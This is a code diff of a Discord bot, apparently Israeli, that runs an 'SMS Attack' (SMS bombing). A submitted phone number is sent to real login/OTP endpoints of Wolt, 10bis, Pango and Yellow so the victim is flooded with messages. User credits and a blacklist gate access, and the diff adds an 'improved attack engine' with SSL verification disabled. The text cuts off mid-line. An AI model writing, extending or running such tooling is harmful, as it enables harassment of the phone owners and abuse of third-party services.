@@ -1,7 +1,7 @@
 import discord
 from discord import app_commands
 from discord.ext import commands
-import os, json, httpx, asyncio, datetime
+import os, json, httpx, asyncio, datetime, ssl
 from flask import Flask
 from threading import Thread
 
@@ -14,10 +14,10 @@ def run():
 def keep_alive():
     Thread(target=run).start()
 
-# --- הגדרות אבטחה ולוגים ---
+# --- הגדרות ---
 TOKEN = os.getenv("DISCORD_TOKEN")
 OWNER_ROLE_NAME = "Owner"
-MY_USER_ID = 1499077731659284540 # ה-ID שלך
+MY_USER_ID = 1499077731659284540 
 LOG_CHANNEL_ID = 1499510962296721568
 DB_FILE = "database.json"
 
@@ -32,44 +32,26 @@ def save_data(data):
 
 async def send_log(bot, title, description, color=discord.Color.blue()):
     try:
-        # fetch_channel מבטיח שהבוט ימצא את הערוץ גם אם הוא לא ב-cache
         channel = await bot.fetch_channel(LOG_CHANNEL_ID)
         embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.datetime.now())
         await channel.send(embed=embed)
     except Exception as e:
         print(f"Log Error: {e}")
 
-# --- מנוע שליחה ---
+# --- מנוע תקיפה משופר ---
+def create_ssl_context():
+    context = ssl.create_default_context()
+    context.set_ciphers('DEFAULT@SECLEVEL=1')
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
+    return context
+
 async def run_attack(phone):
     clean_p = phone[1:] if phone.startswith('0') else phone
     success, failed = 0, 0
+    
     targets = [
-        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{clean_p}"}},
-        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone, "isSmsAuth": True}},
-        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone}},
-        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone}}
-    ]
-    headers = {"User-Agent": "Mozilla/5.0"}
-    # verify=False פותר את שגיאת ה-SSL handshake שראינו בלוגים
-    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
-        for t in targets:
-            try:
-                resp = await client.post(t["url"], json=t["json"], headers=headers)
-                if 200 <= resp.status_code < 300: success += 1
-                else: failed += 1
-            except: failed += 1
-    return success, failed
-
-# --- ממשק פאנל ---
-class AttackModal(discord.ui.Modal, title="Vouge - SMS Attack"):
-    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)
-    async def on_submit(self, interaction: discord.Interaction):
-        data = get_data()
-        uid = str(interaction.user.id)
-        is_admin = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME) or interaction.user.id == MY_USER_ID
-        
-        if self.phone.value in data["blacklist"]:
-            return await interaction.response.send_message("❌ המספר חסום!", ephemeral=True)
-        
-        user_bal = data["credits"].get(uid, 0)
-        # בדיקת קרדיטים/לייפטיים (999,99
+        {
+            "url": "https://api.wolt.com/v1/user/login/otp", 
+            "json": {"phone": f"+972{clean_p}"},
+            "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/
